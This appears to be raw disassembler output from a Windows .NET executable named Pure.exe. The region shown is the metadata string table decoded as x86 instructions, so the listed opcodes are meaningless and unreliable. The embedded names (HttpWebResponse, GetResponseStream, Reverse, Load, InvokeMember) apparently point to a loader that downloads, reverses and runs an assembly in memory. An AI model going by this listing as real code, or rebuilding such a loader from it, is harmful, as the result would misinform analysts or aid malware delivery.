   140002b89:	6c                   	insb   (%dx),(%rdi)
   140002b8a:	6c                   	insb   (%dx),(%rdi)
   140002b8b:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140002b90:	6e                   	outsb  (%rsi),(%dx)
   140002b91:	73 2e                	jae    0x140002bc1
   140002b93:	47                   	rex.RXB
   140002b94:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002b96:	65 72 69             	gs jb  0x140002c02
   140002b99:	63 00                	movsxd (%rax),%eax
   140002b9b:	4c 6f                	rex.WR outsl (%rsi),(%dx)
   140002b9d:	61                   	(bad)
   140002b9e:	64 00 67 65          	add    %ah,%fs:0x65(%rdi)
   140002ba2:	74 5f                	je     0x140002c03
   140002ba4:	48 61                	rex.W (bad)
   140002ba6:	73 45                	jae    0x140002bed
   140002ba8:	78 69                	js     0x140002c13
   140002baa:	74 65                	je     0x140002c11
   140002bac:	64 00 53 79          	add    %dl,%fs:0x79(%rbx)
   140002bb0:	6e                   	outsb  (%rsi),(%dx)
   140002bb1:	63 68 72             	movsxd 0x72(%rax),%ebp
   140002bb4:	6f                   	outsl  (%rsi),(%dx)
   140002bb5:	6e                   	outsb  (%rsi),(%dx)
   140002bb6:	69 7a 65 64 00 64 65 	imul   $0x65640064,0x65(%rdx),%edi
   140002bbd:	66 61                	data16 (bad)
   140002bbf:	75 6c                	jne    0x140002c2d
   140002bc1:	74 49                	je     0x140002c0c
   140002bc3:	6e                   	outsb  (%rsi),(%dx)
   140002bc4:	73 74                	jae    0x140002c3a
   140002bc6:	61                   	(bad)
   140002bc7:	6e                   	outsb  (%rsi),(%dx)
   140002bc8:	63 65 00             	movsxd 0x0(%rbp),%esp
   140002bcb:	73 65                	jae    0x140002c32
   140002bcd:	74 5f                	je     0x140002c2e
   140002bcf:	41 75 74             	rex.B jne 0x140002c46
   140002bd2:	6f                   	outsl  (%rsi),(%dx)
   140002bd3:	53                   	push   %rbx
   140002bd4:	63 61 6c             	movsxd 0x6c(%rcx),%esp
   140002bd7:	65 4d 6f             	rex.WRB outsl %gs:(%rsi),(%dx)
   140002bda:	64 65 00 45 6e       	fs add %al,%gs:0x6e(%rbp)
   140002bdf:	75 6d                	jne    0x140002c4e
   140002be1:	65 72 61             	gs jb  0x140002c45
   140002be4:	62 6c 65 00 49       	(bad)
   140002be9:	44 69 73 70 6f 73 61 	imul   $0x6261736f,0x70(%rbx),%r14d
   140002bf0:	62 
   140002bf1:	6c                   	insb   (%dx),(%rdi)
   140002bf2:	65 00 52 75          	add    %dl,%gs:0x75(%rdx)
   140002bf6:	6e                   	outsb  (%rsi),(%dx)
   140002bf7:	74 69                	je     0x140002c62
   140002bf9:	6d                   	insl   (%dx),(%rdi)
   140002bfa:	65 54                	gs push %rsp
   140002bfc:	79 70                	jns    0x140002c6e
   140002bfe:	65 48 61             	gs rex.W (bad)
   140002c01:	6e                   	outsb  (%rsi),(%dx)
   140002c02:	64 6c                	fs insb (%dx),(%rdi)
   140002c04:	65 00 47 65          	add    %al,%gs:0x65(%rdi)
   140002c08:	74 54                	je     0x140002c5e
   140002c0a:	79 70                	jns    0x140002c7c
   140002c0c:	65 46 72 6f          	gs rex.RX jb 0x140002c7f
   140002c10:	6d                   	insl   (%dx),(%rdi)
   140002c11:	48 61                	rex.W (bad)
   140002c13:	6e                   	outsb  (%rsi),(%dx)
   140002c14:	64 6c                	fs insb (%dx),(%rdi)
   140002c16:	65 00 73 65          	add    %dh,%gs:0x65(%rbx)
   140002c1a:	74 5f                	je     0x140002c7b
   140002c1c:	57                   	push   %rdi
   140002c1d:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%rsi),%ebp
   140002c24:	79 6c                	jns    0x140002c92
   140002c26:	65 00 50 72          	add    %dl,%gs:0x72(%rax)
   140002c2a:	6f                   	outsl  (%rsi),(%dx)
   140002c2b:	63 65 73             	movsxd 0x73(%rbp),%esp
   140002c2e:	73 57                	jae    0x140002c87
   140002c30:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%rsi),%ebp
   140002c37:	79 6c                	jns    0x140002ca5
   140002c39:	65 00 67 65          	add    %ah,%gs:0x65(%rdi)
   140002c3d:	74 5f                	je     0x140002c9e
   140002c3f:	4e 61                	rex.WRX (bad)
   140002c41:	6d                   	insl   (%dx),(%rdi)
   140002c42:	65 00 73 65          	add    %dh,%gs:0x65(%rbx)
   140002c46:	74 5f                	je     0x140002ca7
   140002c48:	4e 61                	rex.WRX (bad)
   140002c4a:	6d                   	insl   (%dx),(%rdi)
   140002c4b:	65 00 73 65          	add    %dh,%gs:0x65(%rbx)
   140002c4f:	74 5f                	je     0x140002cb0
   140002c51:	46 69 6c 65 4e 61 6d 	imul   $0x656d61,0x4e(%rbp,%r12,2),%r13d
   140002c58:	65 00 
   140002c5a:	67 65 74 5f          	addr32 gs je 0x140002cbd
   140002c5e:	46 75 6c             	rex.RX jne 0x140002ccd
   140002c61:	6c                   	insb   (%dx),(%rdi)
   140002c62:	4e 61                	rex.WRX (bad)
   140002c64:	6d                   	insl   (%dx),(%rdi)
   140002c65:	65 00 53 65          	add    %dl,%gs:0x65(%rbx)
   140002c69:	63 75 72             	movsxd 0x72(%rbp),%esi
   140002c6c:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%rcx,%rdi,2),%esi
   140002c73:	6f 
   140002c74:	63 6f 6c             	movsxd 0x6c(%rdi),%ebp
   140002c77:	54                   	push   %rsp
   140002c78:	79 70                	jns    0x140002cea
   140002c7a:	65 00 53 79          	add    %dl,%gs:0x79(%rbx)
   140002c7e:	73 74                	jae    0x140002cf4
   140002c80:	65 6d                	gs insl (%dx),(%rdi)
   140002c82:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140002c85:	72 65                	jb     0x140002cec
   140002c87:	00 50 75             	add    %dl,0x75(%rax)
   140002c8a:	72 65                	jb     0x140002cf1
   140002c8c:	00 67 65             	add    %ah,0x65(%rdi)
   140002c8f:	74 5f                	je     0x140002cf0
   140002c91:	43 75 6c             	rex.XB jne 0x140002d00
   140002c94:	74 75                	je     0x140002d0b
   140002c96:	72 65                	jb     0x140002cfd
   140002c98:	00 73 65             	add    %dh,0x65(%rbx)
   140002c9b:	74 5f                	je     0x140002cfc
   140002c9d:	43 75 6c             	rex.XB jne 0x140002d0c
   140002ca0:	74 75                	je     0x140002d17
   140002ca2:	72 65                	jb     0x140002d09
   140002ca4:	00 72 65             	add    %dh,0x65(%rdx)
   140002ca7:	73 6f                	jae    0x140002d18
   140002ca9:	75 72                	jne    0x140002d1d
   140002cab:	63 65 43             	movsxd 0x43(%rbp),%esp
   140002cae:	75 6c                	jne    0x140002d1c
   140002cb0:	74 75                	je     0x140002d27
   140002cb2:	72 65                	jb     0x140002d19
   140002cb4:	00 41 70             	add    %al,0x70(%rcx)
   140002cb7:	70 6c                	jo     0x140002d25
   140002cb9:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%rbx),%esp
   140002cc0:	53                   	push   %rbx
   140002cc1:	65 74 74             	gs je  0x140002d38
   140002cc4:	69 6e 67 73 42 61 73 	imul   $0x73614273,0x67(%rsi),%ebp
   140002ccb:	65 00 48 74          	add    %cl,%gs:0x74(%rax)
   140002ccf:	74 70                	je     0x140002d41
   140002cd1:	57                   	push   %rdi
   140002cd2:	65 62 52 65 73 70    	(bad)
   140002cd8:	6f                   	outsl  (%rsi),(%dx)
   140002cd9:	6e                   	outsb  (%rsi),(%dx)
   140002cda:	73 65                	jae    0x140002d41
   140002cdc:	00 47 65             	add    %al,0x65(%rdi)
   140002cdf:	74 52                	je     0x140002d33
   140002ce1:	65 73 70             	gs jae 0x140002d54
   140002ce4:	6f                   	outsl  (%rsi),(%dx)
   140002ce5:	6e                   	outsb  (%rsi),(%dx)
   140002ce6:	73 65                	jae    0x140002d4d
   140002ce8:	00 44 69 73          	add    %al,0x73(%rcx,%rbp,2)
   140002cec:	70 6f                	jo     0x140002d5d
   140002cee:	73 65                	jae    0x140002d55
   140002cf0:	00 52 65             	add    %dl,0x65(%rdx)
   140002cf3:	76 65                	jbe    0x140002d5a
   140002cf5:	72 73                	jb     0x140002d6a
   140002cf7:	65 00 43 72          	add    %al,%gs:0x72(%rbx)
   140002cfb:	65 61                	gs (bad)
   140002cfd:	74 65                	je     0x140002d64
   140002cff:	00 45 64             	add    %al,0x64(%rbp)
   140002d02:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%rdi,%rbp,2),%esi
   140002d09:	77 
   140002d0a:	73 61                	jae    0x140002d6d
   140002d0c:	62 6c 65 53 74       	(bad)
   140002d11:	61                   	(bad)
   140002d12:	74 65                	je     0x140002d79
   140002d14:	00 73 69             	add    %dh,0x69(%rbx)
   140002d17:	74 65                	je     0x140002d7e
   140002d19:	00 53 54             	add    %dl,0x54(%rbx)
   140002d1c:	41 54                	push   %r12
   140002d1e:	68 72 65 61 64       	push   $0x64616572
   140002d23:	41 74 74             	rex.B je 0x140002d9a
   140002d26:	72 69                	jb     0x140002d91
   140002d28:	62 75 74 65 00       	(bad)
   140002d2d:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140002d2f:	6d                   	insl   (%dx),(%rdi)
   140002d30:	70 69                	jo     0x140002d9b
   140002d32:	6c                   	insb   (%dx),(%rdi)
   140002d33:	65 72 47             	gs jb  0x140002d7d
   140002d36:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002d38:	65 72 61             	gs jb  0x140002d9c
   140002d3b:	74 65                	je     0x140002da2
   140002d3d:	64 41 74 74          	fs rex.B je 0x140002db5
   140002d41:	72 69                	jb     0x140002dac
   140002d43:	62 75 74 65 00       	(bad)
   140002d48:	47 75 69             	rex.RXB jne 0x140002db4
   140002d4b:	64 41 74 74          	fs rex.B je 0x140002dc3
   140002d4f:	72 69                	jb     0x140002dba
   140002d51:	62 75 74 65 00       	(bad)
   140002d56:	47                   	rex.RXB
   140002d57:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002d59:	65 72 61             	gs jb  0x140002dbd
   140002d5c:	74 65                	je     0x140002dc3
   140002d5e:	64 43 6f             	rex.XB outsl %fs:(%rsi),(%dx)
   140002d61:	64 65 41 74 74       	fs gs rex.B je 0x140002dda
   140002d66:	72 69                	jb     0x140002dd1
   140002d68:	62 75 74 65 00       	(bad)
   140002d6d:	44                   	rex.R
   140002d6e:	65 62 75 67 67 65    	(bad)
   140002d74:	72 4e                	jb     0x140002dc4
   140002d76:	6f                   	outsl  (%rsi),(%dx)
   140002d77:	6e                   	outsb  (%rsi),(%dx)
   140002d78:	55                   	push   %rbp
   140002d79:	73 65                	jae    0x140002de0
   140002d7b:	72 43                	jb     0x140002dc0
   140002d7d:	6f                   	outsl  (%rsi),(%dx)
   140002d7e:	64 65 41 74 74       	fs gs rex.B je 0x140002df7
   140002d83:	72 69                	jb     0x140002dee
   140002d85:	62 75 74 65 00       	(bad)
   140002d8a:	44                   	rex.R
   140002d8b:	65 62 75 67 67 61    	(bad)
   140002d91:	62 6c 65 41 74       	(bad)
   140002d96:	74 72                	je     0x140002e0a
   140002d98:	69 62 75 74 65 00 45 	imul   $0x45006574,0x75(%rdx),%esp
   140002d9f:	64 69 74 6f 72 42 72 	imul   $0x776f7242,%fs:0x72(%rdi,%rbp,2),%esi
   140002da6:	6f 77 
   140002da8:	73 61                	jae    0x140002e0b
   140002daa:	62 6c 65 41 74       	(bad)
   140002daf:	74 72                	je     0x140002e23
   140002db1:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%rdx),%esp
   140002db8:	6f                   	outsl  (%rsi),(%dx)
   140002db9:	6d                   	insl   (%dx),(%rdi)
   140002dba:	56                   	push   %rsi
   140002dbb:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%rbx),%esi
   140002dc2:	74 74                	je     0x140002e38
   140002dc4:	72 69                	jb     0x140002e2f
   140002dc6:	62 75 74 65 00       	(bad)
   140002dcb:	41 73 73             	rex.B jae 0x140002e41
   140002dce:	65 6d                	gs insl (%dx),(%rdi)
   140002dd0:	62 6c 79 54 69       	(bad)
   140002dd5:	74 6c                	je     0x140002e43
   140002dd7:	65 41 74 74          	gs rex.B je 0x140002e4f
   140002ddb:	72 69                	jb     0x140002e46
   140002ddd:	62 75 74 65 00       	(bad)
   140002de2:	41 73 73             	rex.B jae 0x140002e58
   140002de5:	65 6d                	gs insl (%dx),(%rdi)
   140002de7:	62 6c 79 54 72       	(bad)
   140002dec:	61                   	(bad)
   140002ded:	64 65 6d             	fs gs insl (%dx),(%rdi)
   140002df0:	61                   	(bad)
   140002df1:	72 6b                	jb     0x140002e5e
   140002df3:	41 74 74             	rex.B je 0x140002e6a
   140002df6:	72 69                	jb     0x140002e61
   140002df8:	62 75 74 65 00       	(bad)
   140002dfd:	54                   	push   %rsp
   140002dfe:	61                   	(bad)
   140002dff:	72 67                	jb     0x140002e68
   140002e01:	65 74 46             	gs je  0x140002e4a
   140002e04:	72 61                	jb     0x140002e67
   140002e06:	6d                   	insl   (%dx),(%rdi)
   140002e07:	65 77 6f             	gs ja  0x140002e79
   140002e0a:	72 6b                	jb     0x140002e77
   140002e0c:	41 74 74             	rex.B je 0x140002e83
   140002e0f:	72 69                	jb     0x140002e7a
   140002e11:	62 75 74 65 00       	(bad)
   140002e16:	41 73 73             	rex.B jae 0x140002e8c
   140002e19:	65 6d                	gs insl (%dx),(%rdi)
   140002e1b:	62 6c 79 46 69       	(bad)
   140002e20:	6c                   	insb   (%dx),(%rdi)
   140002e21:	65 56                	gs push %rsi
   140002e23:	65 72 73             	gs jb  0x140002e99
   140002e26:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%rdi),%ebp
   140002e2d:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%rdx),%esp
   140002e34:	73 73                	jae    0x140002ea9
   140002e36:	65 6d                	gs insl (%dx),(%rdi)
   140002e38:	62 6c 79 43 6f       	(bad)
   140002e3d:	6e                   	outsb  (%rsi),(%dx)
   140002e3e:	66 69 67 75 72 61    	imul   $0x6172,0x75(%rdi),%sp
   140002e44:	74 69                	je     0x140002eaf
   140002e46:	6f                   	outsl  (%rsi),(%dx)
   140002e47:	6e                   	outsb  (%rsi),(%dx)
   140002e48:	41 74 74             	rex.B je 0x140002ebf
   140002e4b:	72 69                	jb     0x140002eb6
   140002e4d:	62 75 74 65 00       	(bad)
   140002e52:	41 73 73             	rex.B jae 0x140002ec8
   140002e55:	65 6d                	gs insl (%dx),(%rdi)
   140002e57:	62 6c 79 44 65       	(bad)
   140002e5c:	73 63                	jae    0x140002ec1
   140002e5e:	72 69                	jb     0x140002ec9
   140002e60:	70 74                	jo     0x140002ed6
   140002e62:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%rdi),%ebp
   140002e69:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%rdx),%esp
   140002e70:	6f                   	outsl  (%rsi),(%dx)
   140002e71:	6d                   	insl   (%dx),(%rdi)
   140002e72:	70 69                	jo     0x140002edd
   140002e74:	6c                   	insb   (%dx),(%rdi)
   140002e75:	61                   	(bad)
   140002e76:	74 69                	je     0x140002ee1
   140002e78:	6f                   	outsl  (%rsi),(%dx)
   140002e79:	6e                   	outsb  (%rsi),(%dx)
   140002e7a:	52                   	push   %rdx
   140002e7b:	65 6c                	gs insb (%dx),(%rdi)
   140002e7d:	61                   	(bad)
   140002e7e:	78 61                	js     0x140002ee1
   140002e80:	74 69                	je     0x140002eeb
   140002e82:	6f                   	outsl  (%rsi),(%dx)
   140002e83:	6e                   	outsb  (%rsi),(%dx)
   140002e84:	73 41                	jae    0x140002ec7
   140002e86:	74 74                	je     0x140002efc
   140002e88:	72 69                	jb     0x140002ef3
   140002e8a:	62 75 74 65 00       	(bad)
   140002e8f:	41 73 73             	rex.B jae 0x140002f05
   140002e92:	65 6d                	gs insl (%dx),(%rdi)
   140002e94:	62 6c 79 50 72       	(bad)
   140002e99:	6f                   	outsl  (%rsi),(%dx)
   140002e9a:	64 75 63             	fs jne 0x140002f00
   140002e9d:	74 41                	je     0x140002ee0
   140002e9f:	74 74                	je     0x140002f15
   140002ea1:	72 69                	jb     0x140002f0c
   140002ea3:	62 75 74 65 00       	(bad)
   140002ea8:	41 73 73             	rex.B jae 0x140002f1e
   140002eab:	65 6d                	gs insl (%dx),(%rdi)
   140002ead:	62 6c 79 43 6f       	(bad)
   140002eb2:	70 79                	jo     0x140002f2d
   140002eb4:	72 69                	jb     0x140002f1f
   140002eb6:	67 68 74 41 74 74    	addr32 push $0x74744174
   140002ebc:	72 69                	jb     0x140002f27
   140002ebe:	62 75 74 65 00       	(bad)
   140002ec3:	41 73 73             	rex.B jae 0x140002f39
   140002ec6:	65 6d                	gs insl (%dx),(%rdi)
   140002ec8:	62 6c 79 43 6f       	(bad)
   140002ecd:	6d                   	insl   (%dx),(%rdi)
   140002ece:	70 61                	jo     0x140002f31
   140002ed0:	6e                   	outsb  (%rsi),(%dx)
   140002ed1:	79 41                	jns    0x140002f14
   140002ed3:	74 74                	je     0x140002f49
   140002ed5:	72 69                	jb     0x140002f40
   140002ed7:	62 75 74 65 00       	(bad)
   140002edc:	52                   	push   %rdx
   140002edd:	75 6e                	jne    0x140002f4d
   140002edf:	74 69                	je     0x140002f4a
   140002ee1:	6d                   	insl   (%dx),(%rdi)
   140002ee2:	65 43 6f             	rex.XB outsl %gs:(%rsi),(%dx)
   140002ee5:	6d                   	insl   (%dx),(%rdi)
   140002ee6:	70 61                	jo     0x140002f49
   140002ee8:	74 69                	je     0x140002f53
   140002eea:	62 69 6c 69 74       	(bad)
   140002eef:	79 41                	jns    0x140002f32
   140002ef1:	74 74                	je     0x140002f67
   140002ef3:	72 69                	jb     0x140002f5e
   140002ef5:	62 75 74 65 00       	(bad)
   140002efa:	76 61                	jbe    0x140002f5d
   140002efc:	6c                   	insb   (%dx),(%rdi)
   140002efd:	75 65                	jne    0x140002f64
   140002eff:	00 50 75             	add    %dl,0x75(%rax)
   140002f02:	72 65                	jb     0x140002f69
   140002f04:	2e 65 78 65          	cs js,pn 0x140002f6d
   140002f08:	00 73 65             	add    %dh,0x65(%rbx)
   140002f0b:	74 5f                	je     0x140002f6c
   140002f0d:	43 6c                	rex.XB insb (%dx),(%rdi)
   140002f0f:	69 65 6e 74 53 69 7a 	imul   $0x7a695374,0x6e(%rbp),%esp
   140002f16:	65 00 53 79          	add    %dl,%gs:0x79(%rbx)
   140002f1a:	73 74                	jae    0x140002f90
   140002f1c:	65 6d                	gs insl (%dx),(%rdi)
   140002f1e:	2e 52                	cs push %rdx
   140002f20:	75 6e                	jne    0x140002f90
   140002f22:	74 69                	je     0x140002f8d
   140002f24:	6d                   	insl   (%dx),(%rdi)
   140002f25:	65 2e 56             	gs cs push %rsi
   140002f28:	65 72 73             	gs jb  0x140002f9e
   140002f2b:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%rdi),%ebp
   140002f32:	53                   	push   %rbx
   140002f33:	74 72                	je     0x140002fa7
   140002f35:	69 6e 67 00 64 69 73 	imul   $0x73696400,0x67(%rsi),%ebp
   140002f3c:	70 6f                	jo     0x140002fad
   140002f3e:	73 69                	jae    0x140002fa9
   140002f40:	6e                   	outsb  (%rsi),(%dx)
   140002f41:	67 00 53 79          	add    %dl,0x79(%ebx)
   140002f45:	73 74                	jae    0x140002fbb
   140002f47:	65 6d                	gs insl (%dx),(%rdi)
   140002f49:	2e 44 72 61          	rex.R jb,pn 0x140002fae
   140002f4d:	77 69                	ja     0x140002fb8
   140002f4f:	6e                   	outsb  (%rsi),(%dx)
   140002f50:	67 00 53 79          	add    %dl,0x79(%ebx)
   140002f54:	73 74                	jae    0x140002fca
   140002f56:	65 6d                	gs insl (%dx),(%rdi)
   140002f58:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140002f5b:	6d                   	insl   (%dx),(%rdi)
   140002f5c:	70 6f                	jo     0x140002fcd
   140002f5e:	6e                   	outsb  (%rsi),(%dx)
   140002f5f:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140002f61:	74 4d                	je     0x140002fb0
   140002f63:	6f                   	outsl  (%rsi),(%dx)
   140002f64:	64 65 6c             	fs gs insb (%dx),(%rdi)
   140002f67:	00 73 65             	add    %dh,0x65(%rbx)
   140002f6a:	74 5f                	je     0x140002fcb
   140002f6c:	53                   	push   %rbx
   140002f6d:	65 63 75 72          	movsxd %gs:0x72(%rbp),%esi
   140002f71:	69 74 79 50 72 6f 74 	imul   $0x6f746f72,0x50(%rcx,%rdi,2),%esi
   140002f78:	6f 
   140002f79:	63 6f 6c             	movsxd 0x6c(%rdi),%ebp
   140002f7c:	00 43 6f             	add    %al,0x6f(%rbx)
   140002f7f:	6e                   	outsb  (%rsi),(%dx)
   140002f80:	74 61                	je     0x140002fe3
   140002f82:	69 6e 65 72 43 6f 6e 	imul   $0x6e6f4372,0x65(%rsi),%ebp
   140002f89:	74 72                	je     0x140002ffd
   140002f8b:	6f                   	outsl  (%rsi),(%dx)
   140002f8c:	6c                   	insb   (%dx),(%rdi)
   140002f8d:	00 75 72             	add    %dh,0x72(%rbp)
   140002f90:	6c                   	insb   (%dx),(%rdi)
   140002f91:	00 47 65             	add    %al,0x65(%rdi)
   140002f94:	74 52                	je     0x140002fe8
   140002f96:	65 73 70             	gs jae 0x140003009
   140002f99:	6f                   	outsl  (%rsi),(%dx)
   140002f9a:	6e                   	outsb  (%rsi),(%dx)
   140002f9b:	73 65                	jae    0x140003002
   140002f9d:	53                   	push   %rbx
   140002f9e:	74 72                	je     0x140003012
   140002fa0:	65 61                	gs (bad)
   140002fa2:	6d                   	insl   (%dx),(%rdi)
   140002fa3:	00 4d 65             	add    %cl,0x65(%rbp)
   140002fa6:	6d                   	insl   (%dx),(%rdi)
   140002fa7:	6f                   	outsl  (%rsi),(%dx)
   140002fa8:	72 79                	jb     0x140003023
   140002faa:	53                   	push   %rbx
   140002fab:	74 72                	je     0x14000301f
   140002fad:	65 61                	gs (bad)
   140002faf:	6d                   	insl   (%dx),(%rdi)
   140002fb0:	00 50 72             	add    %dl,0x72(%rax)
   140002fb3:	6f                   	outsl  (%rsi),(%dx)
   140002fb4:	67 72 61             	addr32 jb 0x140003018
   140002fb7:	6d                   	insl   (%dx),(%rdi)
   140002fb8:	00 53 79             	add    %dl,0x79(%rbx)
   140002fbb:	73 74                	jae    0x140003031
   140002fbd:	65 6d                	gs insl (%dx),(%rdi)
   140002fbf:	00 46 6f             	add    %al,0x6f(%rsi)
   140002fc2:	72 6d                	jb     0x140003031
   140002fc4:	00 72 65             	add    %dh,0x65(%rdx)
   140002fc7:	73 6f                	jae    0x140003038
   140002fc9:	75 72                	jne    0x14000303d
   140002fcb:	63 65 4d             	movsxd 0x4d(%rbp),%esp
   140002fce:	61                   	(bad)
   140002fcf:	6e                   	outsb  (%rsi),(%dx)
   140002fd0:	00 4d 61             	add    %cl,0x61(%rbp)
   140002fd3:	69 6e 00 53 79 73 74 	imul   $0x74737953,0x0(%rsi),%ebp
   140002fda:	65 6d                	gs insl (%dx),(%rdi)
   140002fdc:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140002fdf:	6e                   	outsb  (%rsi),(%dx)
   140002fe0:	66 69 67 75 72 61    	imul   $0x6172,0x75(%rdi),%sp
   140002fe6:	74 69                	je     0x140003051
   140002fe8:	6f                   	outsl  (%rsi),(%dx)
   140002fe9:	6e                   	outsb  (%rsi),(%dx)
   140002fea:	00 53 79             	add    %dl,0x79(%rbx)
   140002fed:	73 74                	jae    0x140003063
   140002fef:	65 6d                	gs insl (%dx),(%rdi)
   140002ff1:	2e 47 6c             	cs rex.RXB insb (%dx),(%rdi)
   140002ff4:	6f                   	outsl  (%rsi),(%dx)
   140002ff5:	62 61 6c 69 7a       	(bad)
   140002ffa:	61                   	(bad)
   140002ffb:	74 69                	je     0x140003066
   140002ffd:	6f                   	outsl  (%rsi),(%dx)
   140002ffe:	6e                   	outsb  (%rsi),(%dx)
   140002fff:	00 53 79             	add    %dl,0x79(%rbx)
   140003002:	73 74                	jae    0x140003078
   140003004:	65 6d                	gs insl (%dx),(%rdi)
   140003006:	2e 52                	cs push %rdx
   140003008:	65 66 6c             	gs data16 insb (%dx),(%rdi)
   14000300b:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140003010:	6e                   	outsb  (%rsi),(%dx)
   140003011:	00 45 78             	add    %al,0x78(%rbp)
   140003014:	63 65 70             	movsxd 0x70(%rbp),%esp
   140003017:	74 69                	je     0x140003082
   140003019:	6f                   	outsl  (%rsi),(%dx)
   14000301a:	6e                   	outsb  (%rsi),(%dx)
   14000301b:	00 42 75             	add    %al,0x75(%rdx)
   14000301e:	74 74                	je     0x140003094
   140003020:	6f                   	outsl  (%rsi),(%dx)
   140003021:	6e                   	outsb  (%rsi),(%dx)
   140003022:	00 43 6f             	add    %al,0x6f(%rbx)
   140003025:	70 79                	jo     0x1400030a0
   140003027:	54                   	push   %rsp
   140003028:	6f                   	outsl  (%rsi),(%dx)
   140003029:	00 4d 65             	add    %cl,0x65(%rbp)
   14000302c:	74 68                	je     0x140003096
   14000302e:	6f                   	outsl  (%rsi),(%dx)
   14000302f:	64 49 6e             	rex.WB outsb %fs:(%rsi),(%dx)
   140003032:	66 6f                	outsw  (%rsi),(%dx)
   140003034:	00 43 75             	add    %al,0x75(%rbx)
   140003037:	6c                   	insb   (%dx),(%rdi)
   140003038:	74 75                	je     0x1400030af
   14000303a:	72 65                	jb     0x1400030a1
   14000303c:	49 6e                	rex.WB outsb (%rsi),(%dx)
   14000303e:	66 6f                	outsw  (%rsi),(%dx)
   140003040:	00 4d 65             	add    %cl,0x65(%rbp)
   140003043:	6d                   	insl   (%dx),(%rdi)
   140003044:	62 65 72 49 6e       	(bad)
   140003049:	66 6f                	outsw  (%rsi),(%dx)
   14000304b:	00 67 65             	add    %ah,0x65(%rdi)
   14000304e:	74 5f                	je     0x1400030af
   140003050:	53                   	push   %rbx
   140003051:	74 61                	je     0x1400030b4
   140003053:	72 74                	jb     0x1400030c9
   140003055:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140003057:	66 6f                	outsw  (%rsi),(%dx)
   140003059:	00 50 72             	add    %dl,0x72(%rax)
   14000305c:	6f                   	outsl  (%rsi),(%dx)
   14000305d:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003060:	73 53                	jae    0x1400030b5
   140003062:	74 61                	je     0x1400030c5
   140003064:	72 74                	jb     0x1400030da
   140003066:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140003068:	66 6f                	outsw  (%rsi),(%dx)
   14000306a:	00 4a 64             	add    %cl,0x64(%rdx)
   14000306d:	63 75 6f             	movsxd 0x6f(%rbp),%esi
   140003070:	00 53 79             	add    %dl,0x79(%rbx)
   140003073:	73 74                	jae    0x1400030e9
   140003075:	65 6d                	gs insl (%dx),(%rdi)
   140003077:	2e 4c 69 6e 71 00 49 	cs imul $0x766e4900,0x71(%rsi),%r13
   14000307e:	6e 76 
   140003080:	6f                   	outsl  (%rsi),(%dx)
   140003081:	6b 65 4d 65          	imul   $0x65,0x4d(%rbp),%esp
   140003085:	6d                   	insl   (%dx),(%rdi)
   140003086:	62 65 72 00 42       	(bad)
   14000308b:	69 6e 64 65 72 00 62 	imul   $0x62007265,0x64(%rsi),%ebp
   140003092:	75 66                	jne    0x1400030fa
   140003094:	66 65 72 00          	data16 gs jb 0x140003098
   140003098:	67 65 74 5f          	addr32 gs je 0x1400030fb
   14000309c:	52                   	push   %rdx
   14000309d:	65 73 6f             	gs jae 0x14000310f
   1400030a0:	75 72                	jne    0x140003114
   1400030a2:	63 65 4d             	movsxd 0x4d(%rbp),%esp
   1400030a5:	61                   	(bad)
   1400030a6:	6e                   	outsb  (%rsi),(%dx)
   1400030a7:	61                   	(bad)
   1400030a8:	67 65 72 00          	addr32 gs jb 0x1400030ac
   1400030ac:	53                   	push   %rbx
   1400030ad:	65 72 76             	gs jb  0x140003126
   1400030b0:	69 63 65 50 6f 69 6e 	imul   $0x6e696f50,0x65(%rbx),%esp
   1400030b7:	74 4d                	je     0x140003106
   1400030b9:	61                   	(bad)
   1400030ba:	6e                   	outsb  (%rsi),(%dx)
   1400030bb:	61                   	(bad)
   1400030bc:	67 65 72 00          	addr32 gs jb 0x1400030c0
   1400030c0:	53                   	push   %rbx
   1400030c1:	79 73                	jns    0x140003136
   1400030c3:	74 65                	je     0x14000312a
   1400030c5:	6d                   	insl   (%dx),(%rdi)
   1400030c6:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   1400030c9:	64 65 44 6f          	fs rex.R outsl %gs:(%rsi),(%dx)
   1400030cd:	6d                   	insl   (%dx),(%rdi)
   1400030ce:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   1400030d1:	6d                   	insl   (%dx),(%rdi)
   1400030d2:	70 69                	jo     0x14000313d
   1400030d4:	6c                   	insb   (%dx),(%rdi)
   1400030d5:	65 72 00             	gs jb  0x1400030d8
   1400030d8:	49                   	rex.WB
   1400030d9:	43 6f                	rex.XB outsl (%rsi),(%dx)
   1400030db:	6e                   	outsb  (%rsi),(%dx)
   1400030dc:	74 61                	je     0x14000313f
   1400030de:	69 6e 65 72 00 2e 63 	imul   $0x632e0072,0x65(%rsi),%ebp
   1400030e5:	74 6f                	je     0x140003156
   1400030e7:	72 00                	jb     0x1400030e9
   1400030e9:	2e 63 63 74          	cs movsxd 0x74(%rbx),%esp
   1400030ed:	6f                   	outsl  (%rsi),(%dx)
   1400030ee:	72 00                	jb     0x1400030f0
   1400030f0:	53                   	push   %rbx
